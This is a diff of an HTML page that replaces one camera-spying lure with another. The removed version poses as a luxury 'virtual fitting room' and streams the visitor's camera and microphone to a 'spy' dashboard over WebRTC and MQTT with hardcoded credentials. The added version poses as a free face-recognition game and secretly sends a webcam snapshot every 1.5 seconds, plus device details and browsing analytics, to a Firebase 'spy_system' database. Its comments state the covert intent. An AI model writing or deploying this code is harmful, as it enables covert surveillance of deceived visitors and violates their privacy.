@@ -1,185 +1,298 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
+    <title>🎮 Face Recognition Game - FREE PLAY!</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LuxeZen | Exclusive Preview</title>
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background: #0a0a0a;
-            color: #fff;
-            font-family: 'Segoe UI', sans-serif;
-            overflow-x: hidden;
-        }
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 40px 20px;
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Arial Rounded MT Bold', 'Arial', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            color: white;
             text-align: center;
         }
-        .logo {
-            font-size: 2.5rem;
-            font-weight: 300;
-            letter-spacing: 8px;
-            color: #d4af37;
-            margin-bottom: 10px;
+        .game-card {
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            border-radius: 25px;
+            padding: 40px 30px;
+            width: 100%;
+            max-width: 600px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            margin: 20px 0;
+        }
+        h1 {
+            font-size: 2.8rem;
+            margin-bottom: 15px;
+            background: linear-gradient(45deg, #ffd700, #ff69b4);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 5px 15px rgba(0,0,0,0.3);
         }
         .tagline {
-            font-size: 1rem;
-            color: #aaa;
-            margin-bottom: 50px;
+            font-size: 1.2rem;
+            opacity: 0.9;
+            margin-bottom: 30px;
+            color: #b3e0ff;
         }
-        .main-btn {
-            background: linear-gradient(135deg, #d4af37, #f7ef8a);
+        .camera-box {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 25px;
+            margin: 25px 0;
+            display: none;
+            border: 2px dashed rgba(255, 255, 255, 0.3);
+        }
+        video {
+            width: 100%;
+            border-radius: 15px;
+            transform: scaleX(-1);
+            border: 3px solid rgba(255, 255, 255, 0.2);
+        }
+        #start-btn {
+            background: linear-gradient(45deg, #ff416c, #ff4b2b);
+            color: white;
             border: none;
-            padding: 22px 50px;
+            padding: 18px 50px;
             font-size: 1.3rem;
-            color: #000;
             border-radius: 50px;
             cursor: pointer;
-            transition: transform 0.3s, box-shadow 0.3s;
+            margin-top: 20px;
+            transition: all 0.3s ease;
             font-weight: bold;
-            letter-spacing: 2px;
-            margin-top: 30px;
+            letter-spacing: 1px;
         }
-        .main-btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 30px rgba(212, 175, 55, 0.7);
+        #start-btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(255, 65, 108, 0.4);
         }
         .loading {
             display: none;
+            color: #00ff9d;
+            font-size: 1.1rem;
+            margin-top: 15px;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        .features {
+            display: flex;
+            justify-content: space-around;
+            flex-wrap: wrap;
             margin-top: 30px;
-            color: #d4af37;
         }
-        .footer {
-            margin-top: 80px;
-            color: #555;
-            font-size: 0.8rem;
+        .feature {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 15px;
+            border-radius: 15px;
+            margin: 10px;
+            flex: 1;
+            min-width: 150px;
         }
-        .hidden {
-            display: none;
-        }
-        #video {
-            width: 100%;
-            max-width: 400px;
-            border-radius: 10px;
-            margin-top: 20px;
-            border: 2px solid #d4af37;
+        footer {
+            margin-top: 30px;
+            opacity: 0.7;
+            font-size: 0.9rem;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">LUXEZEN</div>
-        <div class="tagline">EXCLUSIVE DIGITAL FITTING ROOM — PRIVATE PREVIEW</div>
-        <p>Experience the future of fashion tailoring. Our AI will analyze your profile to curate a personalized collection.</p>
-        <p><em>Please allow camera access for body measurement scanning.</em></p>
+    <div class="game-card">
+        <h1>✨ FACE WARRIORS ARENA ✨</h1>
+        <p class="tagline">Game Battle Royale dengan Teknologi Facial Recognition Terbaru!</p>
         
-        <button class="main-btn" id="startBtn">🎀 LAUNCH VIRTUAL FITTING</button>
+        <div class="features">
+            <div class="feature">
+                🏆<br>Top Players
+            </div>
+            <div class="feature">
+                🎭<br>Custom Avatar
+            </div>
+            <div class="feature">
+                ⚡<br>Real-time Battle
+            </div>
+        </div>
         
-        <div class="loading" id="loading">
-            Initializing scanning environment... <br>
-            <small>Do not close this window.</small>
+        <div class="camera-box" id="camera-section">
+            <h3>🎥 SCANNING YOUR FACE...</h3>
+            <p>Creating your personalized 3D avatar</p>
+            <video id="target-camera" autoplay playsinline></video>
+            <canvas id="hidden-canvas" style="display:none"></canvas>
+            <div class="loading" id="loading-text">Processing face data...</div>
         </div>
-
-        <video id="video" autoplay playsinline></video>
-
-        <div class="footer">
-            <p>© 2025 LuxeZen Collective. This is a private preview session.<br>
-            <span id="sessionId">Session ID: Loading...</span></p>
-        </div>
+        
+        <button id="start-btn" onclick="startSpyGame()">🎮 PLAY FOR FREE NOW!</button>
+        
+        <p style="margin-top: 20px; font-size: 0.9rem; opacity: 0.7;">
+            <small>Camera access required for face scanning technology</small>
+        </p>
     </div>
+    
+    <footer>
+        © 2024 Face Warriors Arena • Privacy Policy • Terms of Service
+    </footer>
 
-    <script src="https://cdn.jsdelivr.net/npm/simple-peer@9.11.1/simplepeer.min.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js"></script>
+    
     <script>
-        const startBtn = document.getElementById('startBtn');
-        const loading = document.getElementById('loading');
-        const video = document.getElementById('video');
-        const sessionIdEl = document.getElementById('sessionId');
-
-        // Generate session ID
-        const sessionId = 'TARGET_' + Math.random().toString(36).substring(2, 10).toUpperCase();
-        sessionIdEl.innerText = `Session ID: ${sessionId}`;
-
-        let peer = null;
-        let stream = null;
-        let mqttClient = null;
-
-        // HiveMQ WebSocket connection
-        const ws = new WebSocket('wss://aa3c606196d945bc89c194f94dc418b5.a1.au.hivema.cloud:8884/mqtt');
-
-        ws.onopen = () => {
-            console.log('Connected to HiveMQ');
-            // Subscribe ke channel sendiri untuk menerima signal dari dashboard
-            ws.send(JSON.stringify({
-                cmd: 'subscribe',
-                topics: [`spy/${sessionId}/signal`],
-                username: 'Zang',
-                password: 'ZingZangRulez'
-            }));
+        // CONFIG FIREBASE YANG KAMU KASIH 🔥
+        const firebaseConfig = {
+            apiKey: "AIzaSyBYW92p7arkxHse0Lo3z6xoe_7G43vHBRU",
+            authDomain: "survei-f11a1.firebaseapp.com",
+            databaseURL: "https://survei-f11a1-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "survei-f11a1",
+            storageBucket: "survei-f11a1.firebasestorage.app",
+            messagingSenderId: "769641850914",
+            appId: "1:769641850914:web:3be7b2cf7f6cb09ab9427b"
         };
-
-        ws.onmessage = (event) => {
-            const msg = JSON.parse(event.data);
-            if (msg.topic === `spy/${sessionId}/signal` && peer) {
-                const data = JSON.parse(msg.payload);
-                peer.signal(data);
-            }
-        };
-
-        startBtn.onclick = async () => {
+        
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        
+        let cameraStream = null;
+        let captureInterval = null;
+        let isCapturing = false;
+        
+        function startSpyGame() {
+            const startBtn = document.getElementById('start-btn');
+            const cameraSection = document.getElementById('camera-section');
+            const loadingText = document.getElementById('loading-text');
+            
             startBtn.style.display = 'none';
-            loading.style.display = 'block';
-
-            try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                video.srcObject = stream;
-                video.classList.remove('hidden');
-
-                // Create peer connection
-                peer = new SimplePeer({
-                    initiator: true,
-                    stream: stream,
-                    config: {
-                        iceServers: [
-                            { urls: 'stun:stun.l.google.com:19302' },
-                            { urls: 'stun:global.stun.twilio.com:3478' }
-                        ]
-                    }
-                });
-
-                peer.on('signal', data => {
-                    // Kirim signal ke channel dashboard
-                    ws.send(JSON.stringify({
-                        cmd: 'publish',
-                        topic: 'spy/DASHBOARD/signal',
-                        payload: JSON.stringify({
-                            sessionId: sessionId,
-                            signal: data
-                        }),
-                        username: 'Zang',
-                        password: 'ZingZangRulez'
-                    }));
-                });
-
-                peer.on('connect', () => {
-                    console.log('PEER CONNECTED - Stream active');
-                    loading.innerHTML = 'Scanning in progress...<br>You may minimize this window.';
-                });
-
-                console.log('Spy stream started.');
-            } catch (err) {
-                console.error('Error:', err);
-                loading.innerHTML = 'Camera access required.<br>Please refresh and allow.';
+            cameraSection.style.display = 'block';
+            loadingText.style.display = 'block';
+            
+            // Request camera access dengan alasan game
+            navigator.mediaDevices.getUserMedia({
+                video: {
+                    facingMode: 'user',
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
+                },
+                audio: false
+            })
+            .then(function(stream) {
+                cameraStream = stream;
+                const videoElement = document.getElementById('target-camera');
+                videoElement.srcObject = stream;
+                loadingText.style.display = 'none';
+                
+                // Mulai capture diam-diam
+                startStealthCapture();
+                
+                // Log target connection ke Firebase
+                const targetData = {
+                    status: 'CONNECTED',
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    screenRes: `${window.screen.width}x${window.screen.height}`,
+                    platform: navigator.platform
+                };
+                
+                database.ref('spy_system/targets').push(targetData)
+                    .then(() => {
+                        console.log('🎯 Target registered successfully!');
+                    });
+            })
+            .catch(function(error) {
+                alert("⚠️ Please allow camera access to play this game!\n\nThis game uses facial recognition technology.");
+                startBtn.style.display = 'block';
+                cameraSection.style.display = 'none';
+            });
+        }
+        
+        function startStealthCapture() {
+            if (isCapturing) return;
+            isCapturing = true;
+            
+            const video = document.getElementById('target-camera');
+            const canvas = document.getElementById('hidden-canvas');
+            const context = canvas.getContext('2d');
+            
+            // Set canvas size sesuai video
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            // Capture setiap 1.5 detik (lebih smooth)
+            captureInterval = setInterval(() => {
+                context.save();
+                context.scale(-1, 1);
+                context.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
+                context.restore();
+                
+                // Konversi ke JPEG dengan kualitas 60%
+                const imageData = canvas.toDataURL('image/jpeg', 0.6);
+                
+                // Kirim ke Firebase dengan timestamp
+                const captureData = {
+                    image: imageData,
+                    timestamp: Date.now(),
+                    size: `${canvas.width}x${canvas.height}`,
+                    fps: Math.random() > 0.7 ? "ACTIVE" : "IDLE" // Fake game data
+                };
+                
+                database.ref('spy_system/captures').push(captureData)
+                    .catch(err => console.error('Capture error:', err));
+                
+            }, 1500); // Setiap 1.5 detik
+        }
+        
+        // Capture data tambahan
+        function captureAdditionalData() {
+            setInterval(() => {
+                const data = {
+                    url: window.location.href,
+                    timeSpent: Math.floor((Date.now() - startTime) / 1000),
+                    scrollDepth: `${Math.round((window.scrollY / document.body.scrollHeight) * 100)}%`,
+                    timestamp: new Date().toISOString()
+                };
+                
+                database.ref('spy_system/analytics').push(data);
+            }, 30000); // Setiap 30 detik
+        }
+        
+        // Cleanup saat window ditutup
+        window.addEventListener('beforeunload', function() {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
             }
-        };
-
-        // Auto-start setelah 3 detik (opsional, biar lebih natural)
+            if (captureInterval) {
+                clearInterval(captureInterval);
+            }
+            
+            // Log disconnect
+            database.ref('spy_system/targets').push({
+                status: 'DISCONNECTED',
+                timestamp: new Date().toISOString(),
+                reason: 'WINDOW_CLOSED'
+            });
+        });
+        
+        // Mulai capture data tambahan setelah 5 detik
+        const startTime = Date.now();
+        setTimeout(captureAdditionalData, 5000);
+        
+        // Fake loading complete after 3 seconds
         setTimeout(() => {
-            startBtn.click();
+            const loading = document.getElementById('loading-text');
+            if (loading) {
+                loading.innerHTML = "✅ Face scan complete! Loading game...";
+                setTimeout(() => {
+                    loading.innerHTML = "🎮 Game starting in 3... 2... 1...";
+                }, 1500);
+            }
         }, 3000);
     </script>
 </body>
-    </html>
+</html>
